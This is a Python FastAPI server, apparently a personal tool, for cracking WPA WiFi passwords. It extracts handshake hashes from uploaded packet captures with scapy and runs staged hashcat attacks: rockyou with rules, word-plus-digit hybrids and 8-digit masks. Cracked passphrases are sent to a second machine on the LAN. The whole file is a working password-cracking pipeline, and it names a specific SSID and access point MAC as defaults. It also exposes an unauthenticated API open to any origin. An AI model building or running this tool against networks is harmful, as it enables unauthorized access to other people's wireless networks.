#!/usr/bin/env python3
"""
Windows WiFi Cracker (port 8766) - hashcat control + receive from Mac.
Reference workflow: hcxpcapngtool -> hashcat (like hcxdumptool ecosystem)
"""
import os, sys, json, subprocess, threading, time, re
from pathlib import Path
from datetime import datetime
from fastapi import FastAPI, UploadFile, File, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

app = FastAPI(title="Windows WiFi Cracker")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

HASHCAT = r"C:\tools\hashcat-7.1.2\hashcat.exe"
HASHCAT_DIR = r"C:\tools\hashcat-7.1.2"
RULES = {
    "best66": os.path.join(r"C:\tools\hashcat-7.1.2\rules", "best66.rule"),
    "dive": os.path.join(r"C:\tools\hashcat-7.1.2\rules", "dive.rule"),
}
WORDLISTS = {
    "rockyou": r"C:\wifi-crack\wordlists\rockyou.txt",
    "wifi_wordlist": r"C:\wifi-crack\wordlists\wifi_wordlist_combined.txt",
}
POTFILE = r"C:\Users\crazydb911\Documents\deepseek\hashes\test_pot"
UPLOAD_DIR = r"C:\Users\crazydb911\Documents\deepseek\uploads"
LOG_DIR = r"C:\Users\crazydb911\Documents\deepseek\logs"
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)

# Thermal management
TEMP_LIMIT = 85       # normal throttle
TEMP_CRIT = 92        # critical abort
TEMP_COOLDOWN = 10    # seconds to wait when throttling

# Log file (rolling by date)
LOG_FILE = os.path.join(LOG_DIR, f"cracker_{datetime.now().strftime('%Y%m%d')}.log")
LOG_LOCK = threading.Lock()

STATE = {
    "status": "idle",
    "message": "Ready",
    "progress": 0,
    "hash_file": None,
    "hash_count": 0,
    "ssid": None,
    "results": [],
    "log": [],
    "gpu_temp": None,
    "gpu_util": None,
    "speed": None,
    "cracking": False,
    "attack_info": None,
    "stopped": False,
}

def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{ts}] {msg}"
    # In-memory (for API/UI)
    STATE["log"].append(entry)
    print(entry, flush=True)
    if len(STATE["log"]) > 800:
        STATE["log"] = STATE["log"][-800:]
    # File (for debugging/optimization)
    with LOG_LOCK:
        try:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(entry + '\n')
        except:
            pass

def get_gpu_status():
    try:
        r = subprocess.run(
            ['nvidia-smi', '--query-gpu=temperature.gpu,utilization.gpu', '--format=csv,noheader'],
            capture_output=True, text=True, timeout=5)
        t, u = r.stdout.strip().split(',')
        STATE["gpu_temp"] = int(t.strip())
        STATE["gpu_util"] = int(u.strip().replace('%', ''))
    except:
        pass

def thermal_monitor():
    """Monitor GPU temp during cracking, throttle if needed."""
    last_throttle = 0
    while STATE["cracking"]:
        get_gpu_status()
        temp = STATE.get("gpu_temp")
        if temp and temp >= TEMP_CRIT:
            if time.time() - last_throttle > TEMP_COOLDOWN:
                STATE["message"] = f"⚠️ GPU {temp}°C - CRITICAL (aborting)..."
                log(f"GPU {temp}°C >= {TEMP_CRIT}°C - CRITICAL")
                last_throttle = time.time()
        elif temp and temp >= TEMP_LIMIT:
            if time.time() - last_throttle > TEMP_COOLDOWN:
                STATE["message"] = f"🌡️ GPU {temp}°C - Throttling (waiting)..."
                log(f"GPU {temp}°C >= {TEMP_LIMIT}°C - Throttle")
                last_throttle = time.time()
                time.sleep(TEMP_COOLDOWN)
        time.sleep(3)

def get_crack_status():
    """Read hashcat progress from restore file or process output."""
    if not STATE["cracking"]:
        return
    # Try to read from the last hashcat output we captured
    try:
        # Check if hashcat is still running
        r = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq hashcat.exe'], capture_output=True, text=True, timeout=5)
        if 'hashcat.exe' not in r.stdout:
            STATE["cracking"] = False
            STATE["status"] = "idle"
            STATE["message"] = "Hashcat finished"
    except:
        pass

def extract_hashes(pcap_path, ssid, ap_mac_hint=None):
    STATE["status"] = "extracting"
    STATE["message"] = f"Extracting handshakes (SSID: {ssid})..."
    STATE["progress"] = 30
    log(f"Extracting from {pcap_path}")
    try:
        from collections import defaultdict
        from scapy.all import rdpcap, Ether, EAPOL_KEY
        pkts = rdpcap(pcap_path)
        log(f"Total packets: {len(pkts)}")
        
        rsc_groups = defaultdict(list)
        ap_mac_detected = ap_mac_hint or None
        
        for pkt in pkts:
            if not pkt.haslayer(EAPOL_KEY):
                continue
            ek = pkt[EAPOL_KEY]
            raw = bytes(ek)
            key_info = int.from_bytes(raw[1:3], 'big')
            msg_num = (key_info >> 8) & 0x03
            rsc_raw = raw[13:17]
            rsc = rsc_raw.hex()
            # Manual parse (scapy fields unreliable)
            key_mic = raw[5:13].hex()
            key_data_len = int.from_bytes(raw[21:23], 'big')
            key_data = raw[23:23+key_data_len]
            nonce = key_data[:32].hex() if key_data_len >= 32 else ''
            dst_mac = '000000000000'
            src_mac = '000000000000'
            if pkt.haslayer(Ether):
                eth = pkt[Ether]
                dst_mac = str(eth.dst).replace(':', '').lower()
                src_mac = str(eth.src).replace(':', '').lower()
                # Detect AP MAC (dst of M1 = AP)
                if msg_num == 1 and not ap_mac_detected:
                    ap_mac_detected = dst_mac
            rsc_groups[rsc].append({
                'msg_num': msg_num, 'dst_mac': dst_mac, 'src_mac': src_mac,
                'nonce': nonce, 'mic': key_mic, 'raw': raw
            })
        
        log(f"RSC groups: {len(rsc_groups)}, AP MAC: {ap_mac_detected}")
        ssid_hex = ssid.encode('utf-8').hex()
        hashes = []
        pairs = 0
        nonce_issues = 0
        for rsc, group in sorted(rsc_groups.items()):
            m1 = [f for f in group if f['msg_num'] in (1, 0)]
            m3 = [f for f in group if f['msg_num'] == 3]
            if not (m1 and m3):
                log(f"  [SKIP {rsc}] M1={len(m1)} M3={len(m3)} (need both)")
                continue
            pairs += 1
            m1f, m3f = m1[0], m3[0]
            ap_mac = m1f['dst_mac'] or ap_mac_detected or '6c4f894ca0e4'
            sta_mac = m1f['src_mac']
            anonce = m1f['nonce']
            key_mic = m3f['mic']
            ek_raw = m3f['raw']
            eapol_len = len(ek_raw)
            full_frame = bytes([1, 0x03]) + eapol_len.to_bytes(2, 'big') + ek_raw
            eapol_hex = full_frame.hex()
            hash_str = f"WPA*02*{key_mic}*{ap_mac}*{sta_mac}*{ssid_hex}*{anonce}*{eapol_hex}*03"
            hashes.append(hash_str)
            # Log details for debugging
            nonce_match = "SAME" if m1f['nonce'] == m3f['nonce'] else "DIFF"
            if nonce_match == "SAME":
                nonce_issues += 1
            # Check for truncated nonce (trailing zeros)
            nonce_trunc = "TRUNCATED" if anonce[-20:] == '0' * 20 else "OK"
            log(f"  [{pairs}] RSC={rsc} AP={ap_mac} STA={sta_mac} nonce={nonce_match}/{nonce_trunc}")
        
        log(f"M1+M3 pairs: {pairs}, nonce issues: {nonce_issues}")
        hash_file = str(Path(pcap_path).with_suffix('.hc22000'))
        with open(hash_file, 'w') as f:
            f.write('\n'.join(hashes) + '\n')
        STATE["hash_file"] = hash_file
        STATE["hash_count"] = len(hashes)
        STATE["ssid"] = ssid
        STATE["nonce_issues"] = nonce_issues
        STATE["status"] = "idle"
        STATE["message"] = f"Extracted {len(hashes)} hashes ({pairs} pairs, {nonce_issues} nonce issues)"
        STATE["progress"] = 50
        log(f"Extracted {len(hashes)} hashes -> {hash_file}")
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Extract error: {e}"
        log(f"Extract error: {e}")

def notify_mac(password):
    """Notify Mac that Windows cracked the password."""
    import requests
    MAC_URL = "http://192.168.1.125:8765"
    try:
        log(f"Notify Mac: {password}")
        r = requests.post(
            f"{MAC_URL}/api/result",
            json={"password": password, "source": "windows_4090"},
            timeout=10)
        if r.status_code == 200:
            log(f"Mac notified: {r.status_code}")
        else:
            log(f"Mac notify failed: {r.status_code}")
    except Exception as e:
        log(f"Mac notify error: {e}")

def crack_hashes(hash_file, wordlist_key, rules_key=None, mode="0", mask=None, finalize=True):
    STATE["status"] = "cracking"
    STATE["cracking"] = True
    wordlist = WORDLISTS.get(wordlist_key, wordlist_key)
    rules = RULES.get(rules_key) if rules_key else None
    info = f"mode={mode}, wordlist={wordlist_key}, rules={rules_key or 'none'}"
    if finalize:
        STATE["progress"] = 60
        STATE["attack_info"] = info
    log(f"Starting hashcat ({info})")
    try:
        # 4090 @ user's 225W cap: -w 3 (EXTRA workload = max perf) +
        # --backend-devices-keepfree=98 = the measured VRAM sweet spot (with the
        # LLM ninefr/qwen3-27b holding ~21.6GB): hashcat gets ~599MB free VRAM
        # at ~1063-1990 kH/s without OOMing the LLM. Higher keepfree starves
        # hashcat (its free-VRAM budget drops to ~0); lower risks OOM on LLM
        # inference spikes. No --hwmon-temp-abort (225W already caps the temp).
        cmd = [HASHCAT, "-m", "22000",
               "--self-test-disable", "--restore-disable",
               "-w", "3",
               "--backend-devices-keepfree=98",
               "--potfile-path", POTFILE]
        if mode == "0":
            # Straight: wordlist (with optional rules)
            cmd.extend(["-a", "0", hash_file, wordlist])
            if rules:
                cmd.extend(["-r", rules])
        elif mode == "6":
            # Hybrid: wordlist + mask suffix. -a 6 appends the mask to every
            # wordlist word, catching the dominant WiFi pattern "word+digits"
            # (e.g. dragon2024, password123). (The old -a 3 "hybrid" silently
            # ignored the wordlist unless the mask carried a ?w token.)
            cmd.extend(["-a", "6", hash_file, wordlist, mask or "?d?d?d?d"])
        elif mode in ("3", "1", "mask"):
            # Mask / brute-force: mask only, no wordlist. -a 1 = brute force,
            # -a 3 = mask (equivalent for a bare mask).
            a_flag = "1" if mode == "1" else "3"
            cmd.extend(["-a", a_flag, hash_file, mask or "?d?d?d?d?d?d?d?d"])
        log(f"CMD: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, cwd=HASHCAT_DIR)
        start_time = time.time()
        last_log = 0
        speed_lines = []
        status_lines = []
        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            # Log progress every 15s
            now = time.time()
            if now - last_log > 15:
                last_log = now
                elapsed = int(now - start_time)
                STATE["message"] = f"Cracking... ({elapsed}s)"
                log(f"[{elapsed}s] {line[:150]}")
            # Collect metrics
            if re.match(r'^[0-9a-f]{64}:', line):
                STATE["results"].append(line)
                log(f"CRACKED: {line}")
            if 'Speed' in line and ('MH/s' in line or 'kH/s' in line):
                speed_lines.append(line)
                STATE["speed"] = line
            if 'Status' in line:
                status_lines.append(line)
                log(f"STATUS: {line}")
            if 'Progress' in line:
                log(f"PROGRESS: {line}")
            if 'Rejected' in line:
                log(f"REJECTED: {line}")
        proc.wait()
        elapsed = int(time.time() - start_time)
        # Save full hashcat output to file
        hc_log = os.path.join(LOG_DIR, f"hashcat_{int(start_time)}.log")
        with open(hc_log, 'w', encoding='utf-8') as f:
            f.write(f"Command: {' '.join(cmd)}\n")
            f.write(f"Start: {datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Elapsed: {elapsed}s\n")
            f.write(f"Results: {STATE['results']}\n")
            f.write(f"Speed (last): {STATE['speed']}\n")
            f.write(f"\nStatus lines:\n")
            for s in status_lines:
                f.write(s + '\n')
        log(f"Hashcat log: {hc_log}")
        if finalize:
            results = STATE["results"]
            if not results:
                results.append("No match")
            STATE["status"] = "cracked" if len(results) > 0 and results[0] != "No match" else "idle"
            STATE["cracking"] = False
            STATE["progress"] = 100
            STATE["message"] = f"Done ({elapsed}s): {len(results)} result(s)"
            log(f"Done in {elapsed}s: {results}")

            # Notify Mac if cracked
            if STATE["status"] == "cracked":
                notify_mac(results[0])
        else:
            # Part of a multi-stage sequence: keep the cracking state so the
            # caller (crack_receive_sequence) decides whether to continue.
            STATE["cracking"] = True
            STATE["status"] = "cracking"
    except Exception as e:
        if finalize:
            STATE["status"] = "idle"
            STATE["cracking"] = False
        STATE["message"] = f"Crack error: {e}"
        log(f"Crack error: {e}")

# Multi-stage attack sequence for Mac-received hashes (expert "start narrow,
# then widen"): run several hashcat attacks in order, stopping as soon as one
# cracks. rockyou+best66 catches weak passwords; the -a 6 hybrid stages catch
# the dominant "word+digits" WiFi pattern (dragon2024, password123); the 8-digit
# mask catches numeric/default passphrases; the dive stage widens rule coverage.
RECEIVE_STAGES = [
    # (wordlist_key, rules_key, mode, mask, label)
    ("rockyou", "best66", "0", None, "rockyou + best66 rules (quick wins)"),
    ("rockyou", None, "6", "?d?d?d?d", "rockyou word + 4-digit suffix (word2024)"),
    ("rockyou", None, "6", "?d?d?d", "rockyou word + 3-digit suffix"),
    (None, None, "3", "?d?d?d?d?d?d?d?d", "8-digit numeric mask (default pws)"),
    ("rockyou", "dive", "0", None, "rockyou + dive rules (extra coverage)"),
]

def crack_receive_sequence(hash_file):
    """Run RECEIVE_STAGES in order; stop at the first stage that cracks."""
    STATE["results"] = []
    STATE["status"] = "cracking"
    STATE["cracking"] = True
    STATE["stopped"] = False
    STATE["progress"] = 20
    STATE["message"] = "Multi-stage: rockyou -> hybrid -> mask -> rules"
    log("Starting multi-stage crack sequence")
    n = len(RECEIVE_STAGES)
    cracked_line = None
    for i, (wl, rules, mode, mask, label) in enumerate(RECEIVE_STAGES):
        if STATE["stopped"]:
            log("Sequence stopped by user")
            break
        STATE["progress"] = int(20 + 80 * i / max(1, n - 1))
        STATE["attack_info"] = f"[{i+1}/{n}] {label}"
        log(f"[stage {i+1}/{n}] {label}")
        crack_hashes(hash_file, wl, rules, mode, mask, finalize=False)
        for r in STATE["results"]:
            if re.match(r'^[0-9a-f]{64}:', r):
                cracked_line = r
                break
        if cracked_line:
            break
    STATE["cracking"] = False
    STATE["progress"] = 100
    if cracked_line:
        pw = cracked_line.split(":", 1)[1] if cracked_line.count(":") >= 1 else cracked_line
        STATE["status"] = "cracked"
        STATE["message"] = f"CRACKED: {pw}"
        log(f"CRACKED: {cracked_line}")
        notify_mac(cracked_line)
    elif STATE["stopped"]:
        STATE["status"] = "idle"
        STATE["message"] = "Stopped"
    else:
        STATE["status"] = "idle"
        if not STATE["results"]:
            STATE["results"] = ["No match"]
        STATE["message"] = f"Done: no match across {n} stages"
        log(f"Sequence done: no match across {n} stages")


@app.get("/")
async def root():
    return HTMLResponse("""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Windows WiFi Cracker</title>
<style>
body{font-family:-apple-system,sans-serif;max-width:1000px;margin:0 auto;padding:20px;background:#1a1a2e;color:#eee}
h1{color:#4fc3f7}
.card{background:#16213e;border-radius:8px;padding:15px;margin:10px 0}
.status{color:#4fc3f7;font-weight:bold}
.progress{width:100%;height:20px;background:#0f3460;border-radius:10px;overflow:hidden}
.progress-bar{height:100%;background:#4fc3f7;transition:width 0.3s}
.log{background:#0f3460;padding:10px;border-radius:4px;font-family:monospace;font-size:12px;max-height:300px;overflow-y:auto}
button{background:#4fc3f7;color:#1a1a2e;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;font-size:16px;margin:5px}
button:hover{background:#29b6f6}
button:disabled{background:#555;cursor:not-allowed}
.gpu{display:flex;gap:20px;margin:10px 0}
.gpu-item{background:#0f3460;padding:10px;border-radius:4px;min-width:100px;text-align:center}
.gpu-value{font-size:24px;color:#4fc3f7;font-weight:bold}
select,input{background:#0f3460;color:#eee;border:none;padding:8px;border-radius:4px;margin:5px}
.results{background:#0f3460;padding:10px;border-radius:4px;font-family:monospace;white-space:pre-wrap;margin-top:10px}
</style></head><body>
<h1>Windows WiFi Cracker (RTX 4090)</h1>
<div class="card">
<div class="status">Status: <span id="status">Loading</span></div>
<div class="progress"><div class="progress-bar" id="progress" style="width:0%"></div></div>
<p id="message">Loading...</p>
<div class="gpu">
<div class="gpu-item"><div>GPU Temp</div><div class="gpu-value" id="gpu-temp">--</div><div id="temp-bar" style="height:4px;background:#4fc3f7;border-radius:2px;margin-top:4px;width:0%"></div></div>
<div class="gpu-item"><div>GPU Util</div><div class="gpu-value" id="gpu-util">--</div></div>
<div class="gpu-item"><div>Hashes</div><div class="gpu-value" id="hash-count">0</div></div>
<div class="gpu-item"><div>SSID</div><div class="gpu-value" style="font-size:14px" id="ssid">--</div></div>
</div>
<div style="margin:10px 0">
<label>Temp Limit: <input type="range" id="temp-limit" min="70" max="95" value="85" style="width:150px;vertical-align:middle"> <span id="temp-limit-val">85</span>°C</label>
<button onclick="stopCrack()" style="background:#ff5252;font-size:14px;padding:6px 14px" id="btn-stop">Stop</button>
</div>
</div>
<div class="card">
<h2>Upload & Extract</h2>
<input type="file" id="pcap-file" accept=".pcap,.pcapng,.cap">
<input type="text" id="ssid-input" placeholder="SSID" style="width:200px">
<button onclick="extract()" id="btn-extract">Extract</button>
</div>
<div class="card">
<h2>Crack</h2>
<select id="wordlist"><option value="rockyou">rockyou (490)</option><option value="wifi_wordlist">wifi_wordlist (175K)</option></select>
<select id="rules"><option value="">No rules</option><option value="best66">best66</option><option value="dive">dive</option></select>
<select id="mode"><option value="0">Straight (-a 0)</option><option value="3">Hybrid (-a 3)</option><option value="mask">Mask (-a 3)</option></select>
<input type="text" id="mask" placeholder="mask (e.g. ?d?d?d?d?d?d?d?d)" style="width:250px">
<button onclick="crack()" id="btn-crack" disabled>Crack</button>
<div class="results" id="results">No results yet</div>
</div>
<div class="card"><h2>Log (live)</h2><div class="log" id="log"></div></div>
<div class="card"><h2>File Log</h2><button onclick="loadLog()" style="font-size:12px;padding:5px 10px">Refresh</button><div class="log" id="log-file" style="max-height:200px"></div></div>
<div class="card"><h2>Uploaded PCAPs</h2><button onclick="listPcaps()" style="font-size:12px;padding:5px 10px">Refresh</button><div class="results" id="pcap-list" style="font-size:12px"></div></div>
<script>
function update(){fetch('/api/state').then(r=>r.json()).then(d=>{
document.getElementById('status').textContent=d.status;
document.getElementById('progress').style.width=d.progress+'%';
document.getElementById('message').textContent=d.message;
document.getElementById('log').innerHTML=d.log.join('<br>');
document.getElementById('log').scrollTop=document.getElementById('log').scrollHeight;
document.getElementById('gpu-temp').textContent=d.gpu_temp?d.gpu_temp+'°C':'--';
document.getElementById('gpu-util').textContent=d.gpu_util?d.gpu_util+'%':'--';
const tb=document.getElementById('temp-bar');
if(d.gpu_temp){tb.style.width=Math.min(d.gpu_temp,100)+'%';
tb.style.background=d.gpu_temp>=85?'#ff5252':d.gpu_temp>=75?'#ff9800':'#4fc3f7';}
document.getElementById('hash-count').textContent=d.hash_count||0;
document.getElementById('ssid').textContent=d.ssid||'--';
document.getElementById('results').textContent=d.results.length?d.results.join('\\n'):'No results yet';
document.getElementById('btn-crack').disabled=!d.hash_file||d.status!=='idle';
document.getElementById('btn-extract').disabled=d.status!=='idle';
}).catch(e=>console.error(e))}
function extract(){
const f=document.getElementById('pcap-file').files[0];
const s=document.getElementById('ssid-input').value||'32H9F_5G';
if(!f){alert('Select pcap');return}
document.getElementById('btn-extract').disabled=true;
const fd=new FormData();fd.append('file',f);fd.append('ssid',s);
fetch('/api/extract',{method:'POST',body:fd}).then(r=>r.json()).then(update);
}
function crack(){
const w=document.getElementById('wordlist').value;
const r=document.getElementById('rules').value||null;
const m=document.getElementById('mode').value;
const mk=document.getElementById('mask').value||null;
const tl=document.getElementById('temp-limit').value;
document.getElementById('btn-crack').disabled=true;
fetch(`/api/crack?wordlist=${w}&rules=${r}&mode=${m}&mask=${encodeURIComponent(mk)}&temp_limit=${tl}`,{method:'POST'}).then(r=>r.json()).then(update);
}
function stopCrack(){fetch('/api/stop',{method:'POST'}).then(r=>r.json()).then(update)}
function loadLog(){fetch('/api/log').then(r=>r.json()).then(d=>{document.getElementById('log-file').textContent=d.lines.join('\\n')})}
function listPcaps(){fetch('/api/pcaps').then(r=>r.json()).then(d=>{document.getElementById('pcap-list').textContent=d.files.map(f=>f.name+' ('+(f.size/1024).toFixed(0)+'KB)').join('\\n')||'No pcaps'})}
document.getElementById('temp-limit').addEventListener('input',function(){
document.getElementById('temp-limit-val').textContent=this.value;
});
update();setInterval(update,2000);setInterval(loadLog,5000);setInterval(listPcaps,10000);
</script></body></html>""")

@app.get("/api/state")
async def get_state():
    get_gpu_status()
    get_crack_status()
    return JSONResponse(STATE)

@app.post("/api/receive-hash")
async def api_receive_hash(request: Request):
    """Receive hash from Mac for complex wordlist cracking."""
    data = await request.json()
    hash_str = data.get("hash")
    ssid = data.get("ssid")
    bssid = data.get("bssid")
    
    if not hash_str:
        return JSONResponse({"ok": False, "error": "No hash"})
    
    log(f"Received hash from Mac: SSID={ssid}, BSSID={bssid}")
    log(f"Hash: {hash_str[:50]}...")
    
    # Save hash to file
    hash_file = os.path.join(UPLOAD_DIR, f"hash_{int(time.time())}.hc22000")
    with open(hash_file, 'w') as f:
        f.write(hash_str + '\n')
    
    STATE["hash_file"] = hash_file
    STATE["hash_count"] = 1
    STATE["ssid"] = ssid
    STATE["status"] = "cracking"
    STATE["cracking"] = True
    STATE["message"] = f"Cracking {ssid} with multi-stage (rockyou->hybrid->mask->rules)..."
    STATE["progress"] = 20

    # Best cracking strategy (expert "start narrow, then widen"): run a
    # multi-stage sequence that stops on the first hit. Stage 1 rockyou+best66
    # (~947M candidates at ~1990 kH/s, 2x faster and ~5000x more coverage than
    # the 175k-word wifi_wordlist); the -a 6 hybrid stages then catch the
    # dominant "word+digits" pattern (dragon2024, password123); the 8-digit
    # mask catches numeric/default passphrases; the dive stage widens rules.
    threading.Thread(target=thermal_monitor, daemon=True).start()
    threading.Thread(target=crack_receive_sequence, args=(hash_file,), daemon=True).start()

    return JSONResponse({"ok": True, "message": "Hash received, running multi-stage crack"})

@app.post("/api/extract")
async def api_extract(file: UploadFile = File(...), ssid: str = "32H9F_5G"):
    content = await file.read()
    ext = ".pcapng" if ".pcapng" in (file.filename or "") else ".pcap"
    pcap_path = os.path.join(UPLOAD_DIR, f"upload_{int(time.time())}{ext}")
    with open(pcap_path, 'wb') as f:
        f.write(content)
    threading.Thread(target=extract_hashes, args=(pcap_path, ssid), daemon=True).start()
    return JSONResponse({"ok": True, "path": pcap_path})

@app.post("/api/crack")
async def api_crack(wordlist: str = "rockyou", rules: str = None, mode: str = "0", mask: str = None, temp_limit: int = 85):
    global TEMP_LIMIT
    if temp_limit:
        TEMP_LIMIT = temp_limit
    if STATE["hash_file"]:
        threading.Thread(target=thermal_monitor, daemon=True).start()
        threading.Thread(target=crack_hashes, args=(STATE["hash_file"], wordlist, rules, mode, mask), daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/stop")
async def api_stop():
    """Stop current cracking."""
    r = subprocess.run(['taskkill', '/F', '/IM', 'hashcat.exe'], capture_output=True, text=True)
    STATE["stopped"] = True
    STATE["cracking"] = False
    STATE["status"] = "idle"
    STATE["message"] = "Stopped"
    log("Crack stopped by user")
    return JSONResponse({"ok": True})

@app.get("/api/log")
async def api_log():
    """Get file log (last 200 lines)."""
    try:
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        return JSONResponse({"lines": lines[-200:]})
    except:
        return JSONResponse({"lines": []})

@app.get("/api/pcaps")
async def api_pcaps():
    """List uploaded pcaps + hash files."""
    files = []
    if os.path.exists(UPLOAD_DIR):
        for f in sorted(os.listdir(UPLOAD_DIR), reverse=True):
            path = os.path.join(UPLOAD_DIR, f)
            size = os.path.getsize(path)
            files.append({"name": f, "size": size, "path": path})
    return JSONResponse({"files": files[:20]})

@app.post("/api/crack_wordlist")
async def api_crack_wordlist(wordlist_path: str, mode: str = "0", rules: str = None, mask: str = None, temp_limit: int = 85):
    """Crack with a custom wordlist path."""
    global TEMP_LIMIT
    if temp_limit:
        TEMP_LIMIT = temp_limit
    if not STATE["hash_file"]:
        return JSONResponse({"ok": False, "error": "No hash file"})
    if not os.path.exists(wordlist_path):
        return JSONResponse({"ok": False, "error": f"Wordlist not found: {wordlist_path}"})
    threading.Thread(target=crack_hashes_custom, args=(STATE["hash_file"], wordlist_path, rules, mode, mask), daemon=True).start()
    return JSONResponse({"ok": True})

def crack_hashes_custom(hash_file, wordlist_path, rules_key, mode, mask):
    """Crack with custom wordlist path."""
    STATE["status"] = "cracking"
    STATE["cracking"] = True
    STATE["progress"] = 30
    STATE["results"] = []
    info = f"mode={mode}, wordlist={wordlist_path}, rules={rules_key or 'none'}"
    STATE["attack_info"] = info
    log(f"Starting hashcat custom ({info})")
    try:
        rules = RULES.get(rules_key) if rules_key else None
        # 4090 @ user's 225W cap: -w 3 (EXTRA workload = max perf) +
        # --backend-devices-keepfree=98 = the measured VRAM sweet spot (with the
        # LLM ninefr/qwen3-27b holding ~21.6GB): hashcat gets ~599MB free VRAM
        # at ~1063-1990 kH/s without OOMing the LLM. Higher keepfree starves
        # hashcat (its free-VRAM budget drops to ~0); lower risks OOM on LLM
        # inference spikes. No --hwmon-temp-abort (225W already caps the temp).
        cmd = [HASHCAT, "-m", "22000",
               "--self-test-disable", "--restore-disable",
               "-w", "3",
               "--backend-devices-keepfree=98",
               "--potfile-path", POTFILE]
        if mode == "0":
            cmd.extend(["-a", "0", hash_file, wordlist_path])
            if rules:
                cmd.extend(["-r", rules])
        elif mode in ("3", "1", "mask"):
            cmd.extend(["-a", "3", hash_file, wordlist_path, mask or "?d?d?d?d?d?d?d?d"])
        log(f"CMD: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, cwd=HASHCAT_DIR)
        start_time = time.time()
        last_log = 0
        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            now = time.time()
            if now - last_log > 15:
                last_log = now
                elapsed = int(now - start_time)
                STATE["message"] = f"Cracking... ({elapsed}s)"
                log(f"[{elapsed}s] {line[:150]}")
            if re.match(r'^[0-9a-f]{64}:', line):
                STATE["results"].append(line)
                log(f"CRACKED: {line}")
            if 'Speed' in line and ('MH/s' in line or 'kH/s' in line):
                STATE["speed"] = line
            if 'Status' in line:
                log(f"STATUS: {line}")
        proc.wait()
        elapsed = int(time.time() - start_time)
        results = STATE["results"]
        if not results:
            results.append("No match")
        STATE["status"] = "idle"
        STATE["cracking"] = False
        STATE["progress"] = 100
        STATE["message"] = f"Done ({elapsed}s): {len(results)} result(s)"
        log(f"Done in {elapsed}s: {results}")
    except Exception as e:
        STATE["status"] = "idle"
        STATE["cracking"] = False
        STATE["message"] = f"Crack error: {e}"
        log(f"Crack error: {e}")

if __name__ == "__main__":
    log("Windows WiFi Cracker starting on port 8766...")
    get_gpu_status()
    uvicorn.run(app, host="0.0.0.0", port=8766)
